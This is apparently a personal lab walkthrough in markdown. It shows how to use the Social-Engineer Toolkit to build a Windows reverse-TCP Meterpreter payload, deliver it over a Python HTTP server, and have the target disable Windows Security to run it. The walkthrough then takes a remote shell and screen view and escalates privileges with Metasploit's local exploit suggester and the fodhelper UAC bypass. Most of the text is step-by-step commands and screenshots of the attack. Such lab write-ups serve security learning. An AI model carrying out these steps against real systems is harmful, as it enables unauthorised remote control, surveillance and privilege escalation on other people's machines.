<h1 align="center"> Create a Payload and Listener </h1>

<img width="1000" height="748" alt="image" src="https://github.com/user-attachments/assets/05599f51-d11a-4934-971d-8c8bc7411960" />


# Create a Payload and Listener Methodology

- Open our `Setoolkit`:
````
sudo setoolkit
````
<img width="693" height="748" alt="image" src="https://github.com/user-attachments/assets/daecc477-47b1-4134-ba22-3f72b0c59bf3" />


- Select on `Social-Engineering Attacks`:
````
1
````
<img width="698" height="743" alt="image" src="https://github.com/user-attachments/assets/1deabe4f-1b25-416c-b4aa-204d839e5286" />


- Select `Create a payload and Listener`:
````
4
````
<img width="682" height="814" alt="image" src="https://github.com/user-attachments/assets/4663b86b-1199-4543-a3a5-8a0023790ad9" />

<img width="1163" height="611" alt="image" src="https://github.com/user-attachments/assets/e6acb2cc-139d-4340-8497-0ed7ce741ef7" />


- Select `Windows Reverse_TCP Meterpreter`:
````
2
````
<img width="1148" height="280" alt="image" src="https://github.com/user-attachments/assets/de43a2ac-94f1-457f-8d85-75936a0d304b" />

- In this we need to Use with `Attacker IP` -> so in this i need to check:
````
ifconfig
````
<img width="985" height="483" alt="image" src="https://github.com/user-attachments/assets/441c6c28-fec4-427d-b137-3ca595744db2" />

- So this my `Attacker Ip`: `192.1658.127.128`.

- So back to our Terminal:
In `IP address for the payload listener (LHOST)`:
````
192.168.127.128
````
<img width="1157" height="293" alt="image" src="https://github.com/user-attachments/assets/578996fd-691f-4efe-800a-39682f1baa17" />


- In `Enter the PORT for the reverse listener` I use:
````
4455
````
<img width="1170" height="385" alt="image" src="https://github.com/user-attachments/assets/ebe5e44e-d79c-45b1-bf1a-bda3c8388c4e" />

- Now it gonna generate the `Payload`, wait a few minutes:
<img width="1007" height="146" alt="image" src="https://github.com/user-attachments/assets/47706f7d-2132-4364-be6c-71054b9bcf2e" />

- Now it finished to generate the `Payload`. And also the `Payload` stored in `/root/.set/payload.exe`.

- Let me check:
<img width="756" height="726" alt="image" src="https://github.com/user-attachments/assets/7eb53771-66f9-42a6-b16e-b1282516aad8" />

- After find Folder `root`:
<img width="760" height="756" alt="image" src="https://github.com/user-attachments/assets/c9fd836e-51b8-49eb-a53e-892595c0e56b" />

- So in this i can't open it, so i need to become a `root`:
- `Right-Click` -> select `Open as Root`:
<img width="1918" height="716" alt="image" src="https://github.com/user-attachments/assets/415863c4-7785-410b-91dc-6025b8443215" />

<img width="496" height="229" alt="image" src="https://github.com/user-attachments/assets/d3d40ea1-cf11-4843-9fd7-a4adf56c55db" />

- Input `Password`:
<img width="1759" height="717" alt="image" src="https://github.com/user-attachments/assets/17eeb9e6-9526-49f3-885f-e6530c7a6a26" />

- After it show new folder -> clicl on `root` folder:
<img width="1334" height="389" alt="image" src="https://github.com/user-attachments/assets/148c2588-e5e4-416b-bf18-134228b34dc0" />

- Now i can't see our `Payload` here.
- After click on `View`:
<img width="1096" height="520" alt="image" src="https://github.com/user-attachments/assets/7590b50f-6531-4935-aa12-0f5381224e8b" />

- After click on `Show Hidden Toolbar...`:

- Now we see alots folder -> find `.set` and click on it: 
<img width="1918" height="546" alt="image" src="https://github.com/user-attachments/assets/53a71446-4228-46a6-a212-25e44097f66e" />

<img width="1067" height="352" alt="image" src="https://github.com/user-attachments/assets/e44ea0db-db82-4ed4-b36b-fa20242e8d4e" />

- Now we see our `Payload` that i was generate.


#### Back to our **Attack Terminal**:

<img width="989" height="146" alt="image" src="https://github.com/user-attachments/assets/be508248-279b-41f6-b363-7ff10747f2e0" />

- After click on:
````
yes
````
<img width="980" height="707" alt="image" src="https://github.com/user-attachments/assets/67b3d318-93aa-4726-9f65-516f2bd3cca8" />

<img width="821" height="787" alt="image" src="https://github.com/user-attachments/assets/2bc5fdad-028b-40d6-9f55-3608feb68c86" />

- Now it will show `Metasploit` command.

### In this we can dilivery payload 

#### Use Python server
- First go to our `payload` folder:
<img width="1917" height="545" alt="image" src="https://github.com/user-attachments/assets/6a067734-8d27-4432-b759-2c34ac412d24" />

<img width="1050" height="577" alt="image" src="https://github.com/user-attachments/assets/ec166266-9e9f-4945-a7ab-530bd86fb1e2" />


- In this open our `Python Server`:
````
python3 -m http.server 8000
````
<img width="706" height="216" alt="image" src="https://github.com/user-attachments/assets/b35ec7fa-9c48-4b11-a44b-1f702390f623" />


- After in target.

#### On target
- Open our target -> go to `Browser`:
````
192.168.127.128:8000
````
<img width="727" height="433" alt="image" src="https://github.com/user-attachments/assets/b8f02147-1c55-4c1b-9bee-e999d625ad7e" />

- `192.168.127.128`: Is my attacker IP.
<img width="1918" height="340" alt="image" src="https://github.com/user-attachments/assets/ff794954-28dd-45f9-b61b-49f1b3bf09ec" />

- Now it block my `Payload`.
<img width="507" height="342" alt="image" src="https://github.com/user-attachments/assets/0f8b835f-dd44-4f1e-bae9-b59290f4d03a" />

<img width="361" height="260" alt="image" src="https://github.com/user-attachments/assets/3db71ae7-f2d6-49d4-8eb7-2b0867c69897" />

<img width="498" height="317" alt="image" src="https://github.com/user-attachments/assets/0eaa6883-fb94-482c-a3c2-53876f08a68f" />


<img width="408" height="303" alt="image" src="https://github.com/user-attachments/assets/63d84bdf-801c-4a3f-acb4-13c307d172ef" />


**Note**: If it error or can't download. Go to `Windows Security`:

<img width="1026" height="803" alt="image" src="https://github.com/user-attachments/assets/8c626785-ad1e-456e-b310-e1d6866a32ad" />

- Set it to `Off`:
<img width="467" height="318" alt="image" src="https://github.com/user-attachments/assets/d1588aed-b957-41b8-9ba7-bf1f57bc7a01" />


<img width="1026" height="806" alt="image" src="https://github.com/user-attachments/assets/323198cd-2447-49b3-9576-687bf722278b" />


- After go to our `Payload` -> click `Download` it again.
<img width="1918" height="372" alt="image" src="https://github.com/user-attachments/assets/0602c540-dd28-4ca0-b235-f91c6c4e6b2f" />

- IT show this, in this we do like above that i show first:
<img width="507" height="342" alt="image" src="https://github.com/user-attachments/assets/0f8b835f-dd44-4f1e-bae9-b59290f4d03a" />

<img width="361" height="260" alt="image" src="https://github.com/user-attachments/assets/3db71ae7-f2d6-49d4-8eb7-2b0867c69897" />

<img width="498" height="317" alt="image" src="https://github.com/user-attachments/assets/0eaa6883-fb94-482c-a3c2-53876f08a68f" />


<img width="408" height="303" alt="image" src="https://github.com/user-attachments/assets/63d84bdf-801c-4a3f-acb4-13c307d172ef" />

<img width="468" height="427" alt="image" src="https://github.com/user-attachments/assets/3a910e7c-eb3b-4e32-b954-86b954aa9687" />

- Now we got successful to `Download` file.
- After go to `Fie`:
<img width="775" height="636" alt="image" src="https://github.com/user-attachments/assets/63330911-62b7-474e-aad0-c373eade4dd9" />

-Also in this i take it into my `Screen`>


- IF i `Open` this `File` -> `Right-Click`:
<img width="572" height="708" alt="image" src="https://github.com/user-attachments/assets/b369580a-f983-4c17-b19d-86c8d3af84b0" />

<img width="537" height="496" alt="image" src="https://github.com/user-attachments/assets/e231e3b6-8f54-4b55-b4a5-fea284105f43" />

<img width="532" height="502" alt="image" src="https://github.com/user-attachments/assets/b64c7dd2-22d6-4af3-a3f0-8d85d2b8bbee" />

<img width="458" height="343" alt="image" src="https://github.com/user-attachments/assets/de60a522-0ff6-48e4-aea7-3392341a4c46" />

- After go to `Attacker Terminal`.

#### Attacker Terminal:
- After go to our `Attacker Terminal`:
<img width="1144" height="550" alt="image" src="https://github.com/user-attachments/assets/29d18f62-8d36-4afa-a2d7-78ee878626d7" />

- After Press `Enter`:
<img width="1112" height="431" alt="image" src="https://github.com/user-attachments/assets/f11317ef-bc73-46a3-995e-1be708f329bf" />

- Type:
````
sessions
````
<img width="1447" height="311" alt="image" src="https://github.com/user-attachments/assets/7d785e86-7a57-4715-8d1b-51f16f1f8dc1" />

- Now we see our target.
 

- IF we want to remote into this `Target`:
````
sessions 1
````
<img width="492" height="106" alt="image" src="https://github.com/user-attachments/assets/7b5b9f50-6183-4c9e-bdfb-b614edf4f98f" />

- Now we got target `Meterpreter`.

- Get help:
````
help
````
Or
````
?
````
<img width="948" height="776" alt="image" src="https://github.com/user-attachments/assets/1359639b-eab8-4c90-a20c-47fba3e6a2cb" />



- Get information from target:
````
sysinfo
````
<img width="598" height="228" alt="image" src="https://github.com/user-attachments/assets/18e2e66e-777f-433c-9e53-c1a661a73c53" />



- Get target screen:
````
screenshare
````
<img width="667" height="109" alt="image" src="https://github.com/user-attachments/assets/56562820-91a7-4131-84a5-85ed22baa922" />

<img width="1379" height="801" alt="image" src="https://github.com/user-attachments/assets/f5ce4dfd-2b34-495f-9828-99cad54ccc1b" />

- In this if in my target go to file:
<img width="1919" height="951" alt="image" src="https://github.com/user-attachments/assets/828e805a-881c-4e2c-9d8c-0bafaa4996aa" />

- And what we see  in attacker screen:
<img width="1350" height="785" alt="image" src="https://github.com/user-attachments/assets/a34d4693-8aa1-4216-8705-09838f7d266d" />

- In this we can see target do anything.


- Get Shell:
````
shell
````
<img width="535" height="172" alt="image" src="https://github.com/user-attachments/assets/e1fafd6b-c05a-41ee-afb3-803b30bab7ce" />

- Now we get Target `Shell`, and why we see `C:\Users\mepol\Downloads>`, cause in target it was downloads our file and stay in `Downloads`:
<img width="903" height="602" alt="image" src="https://github.com/user-attachments/assets/c053f6ad-f513-4359-ab2d-67c4efa7985d" />


- See target `Directory`:
````
dir
````
<img width="880" height="662" alt="image" src="https://github.com/user-attachments/assets/78dd0980-1a5c-4861-b407-abb82823c426" />


- In this if press `Ctrl + C` we will exit the target `Shell` or `Meterpreter`:


- And if we want to get our target meterpreter just type like this same:

````
4
2
192.168.127.128
yes
````
<img width="729" height="789" alt="image" src="https://github.com/user-attachments/assets/b1690e97-3219-458c-b070-4f947d43dd8a" />

<img width="1079" height="593" alt="image" src="https://github.com/user-attachments/assets/97c709ab-8e76-4c55-a006-c6f60c568122" />

<img width="1044" height="665" alt="image" src="https://github.com/user-attachments/assets/46061229-e38c-474d-87ec-d4b5e3357c4d" />

- IF we type in this it will `Auto Connect` to our target like this:
<img width="1015" height="106" alt="image" src="https://github.com/user-attachments/assets/dacc66a8-3471-452b-97ed-56f2fd32e778" />

- In this we can get target `Meterpreter` just type: 
````
sesions
````
<img width="1274" height="275" alt="image" src="https://github.com/user-attachments/assets/47b5152b-266f-4774-833f-5115675802b0" />

- after
````
sessions 1
````
- But in this i dont want to get it:

- But in this i want to find `Target Privilege Escalation`:


### Perform Privileges Escalation
````
bg
````
<img width="280" height="60" alt="image" src="https://github.com/user-attachments/assets/976b135c-9f38-4bd6-ab1f-6200e6742981" />


- In our `handler`:
Search:
````
search bypassuac
````
<img width="1604" height="705" alt="image" src="https://github.com/user-attachments/assets/db59e0f1-d38d-453e-86cd-de101bb6fc7a" />

````
search suggester
````
<img width="1076" height="247" alt="image" src="https://github.com/user-attachments/assets/db597270-f6a6-45f9-9c5f-fb8b7af86b97" />

````
use 0
````
OR we can choose:
````
use post/multi/recon/local_exploit_suggester
show options
````
<img width="980" height="248" alt="image" src="https://github.com/user-attachments/assets/cc309379-eacc-45ad-b951-374585a1dc64" />

- In this we need to use `Sessions`:
````
sessions
show options
````
<img width="1277" height="397" alt="image" src="https://github.com/user-attachments/assets/92c1fcbd-2c4b-45bd-bdb7-d05f677ef423" />

````
set SESSION 1
show options
````
<img width="1283" height="667" alt="image" src="https://github.com/user-attachments/assets/0890c13a-cdbe-49e6-8f49-7bf8e9996dd5" />

````
exploit
````
<img width="1383" height="145" alt="image" src="https://github.com/user-attachments/assets/41de0fa9-58d1-4f45-908b-addd18f965f0" />

- Now it will `Privileges Escalation`, After wait a few minutes it will finished and find what vulnerable that we can do `Privileges Escalation`.

<img width="1251" height="208" alt="image" src="https://github.com/user-attachments/assets/53cddb26-bc06-4f91-bfe8-7767a297d832" />

<img width="1443" height="773" alt="image" src="https://github.com/user-attachments/assets/ba98de22-1960-48da-b80e-6e188010bec2" />

- Now it finished and found what we can do `Privileges`.


- All of these we can use, But in this i use this one:
<img width="1447" height="763" alt="image" src="https://github.com/user-attachments/assets/69ef3fa3-56f6-4783-9a78-d61ffd2e61d9" />

````
use exploit/windows/local/bypassuac_fodhelper
show options
````
<img width="1023" height="632" alt="image" src="https://github.com/user-attachments/assets/40b43a72-8291-4547-a68c-8c127f119daa" />


- Check session
````
sessions
````

- Use sessions
````
set SESSION 1
show options
````
<img width="1435" height="781" alt="image" src="https://github.com/user-attachments/assets/f9ddff81-2ddd-41d9-9e91-e9ac4ff6b993" />

- Exploit it:
````
exploit
````
<img width="727" height="105" alt="image" src="https://github.com/user-attachments/assets/b47e80eb-2e56-4fcc-b511-ba5a65cccc9a" />

- In this it not work cause we already in an elevated session.
- It mean we are already has elevated privileges (as shown by "Already in elevated state").

> **Also in this it mean our target run our Pyaload as administrator.**

- To get `Meterpreter`:
````
sessions -i 1
````
<img width="673" height="113" alt="image" src="https://github.com/user-attachments/assets/b5c1da01-f004-458c-b70d-ecc29a6cd0e7" />

- Now we get meterpreter.

---




### If in this i run it as normal user:

- First i was delete and create new ``Payload``:
````
sudo setoolkit
````
<img width="677" height="767" alt="image" src="https://github.com/user-attachments/assets/a809ba01-87bc-4b8c-b065-68b6ce1ab111" />


- Also in this i don't show demo screenshot cause it the  same above. I just show command:
````
1
````
````
4
````
````
2
````
````
192.168.127.128
````
````
4455
````
````
yes
````
- In target -> double click on it:
<img width="850" height="650" alt="image" src="https://github.com/user-attachments/assets/8b0be84b-5c3b-44f6-9a8f-daedaa21a1a9" />


- After back to our `Attacker Terminal`:
````
sessions
````
<img width="1420" height="687" alt="image" src="https://github.com/user-attachments/assets/cf71172f-ce89-4273-943e-e741878d113f" />

- In this we will see `2` of session, but `2` is run as normal user:


````
search suggester
````
````
use 0
````
````
sessions
````
````
set SESSION 2
````
````
exploit
````
<img width="1527" height="205" alt="image" src="https://github.com/user-attachments/assets/b6fb0dc2-8e59-4413-9575-ec717ccb6214" />

<img width="1440" height="762" alt="image" src="https://github.com/user-attachments/assets/7c51048f-4f6c-416e-a5f5-d7c9594a5223" />


````
use exploit/windows/local/bypassuac_fodhelper
show options
````
<img width="953" height="571" alt="image" src="https://github.com/user-attachments/assets/9565eed2-c235-4a01-8dff-14cf8ae1aca8" />

<img width="1292" height="793" alt="image" src="https://github.com/user-attachments/assets/d9713c1f-8e27-45d7-8780-fc4521f0cbf1" />


````
sessions
set SESSION 2
show options
````
````
exploit
````
<img width="1029" height="361" alt="image" src="https://github.com/user-attachments/assets/04a9ce8a-5bef-41bc-80a3-1c4e26f1c4ef" />

<img width="1142" height="804" alt="image" src="https://github.com/user-attachments/assets/175d5703-bc8f-4696-bbcb-2c34857849b1" />

- Now we got successful to get `Privileged Escalation`:


> **Important note: We do privileges escalation until our target run as normal use. If our target run as administrator we alrady got privilege Auto.**

- And how to know what privileged or normal:
<img width="1297" height="313" alt="image" src="https://github.com/user-attachments/assets/917d692f-ea56-44a8-97f1-b81e46243b17" />

- `1` : `NT AUTHORITY\SYSTEM @ DESKTOP-KEE863N` Already have privileged.

- `2` : `DESKTOP-KEE863N\mepol @ DESKTOP-KEE863N` Normal run.

-----

<h2 align="center"> Finised OF Create a Payload and Listener </h2>

<h2 align="center"> Author: Nin Kanong (k4n0ng) </h2>

<h3 align="center"> Date: 26/11/2025 </h3>
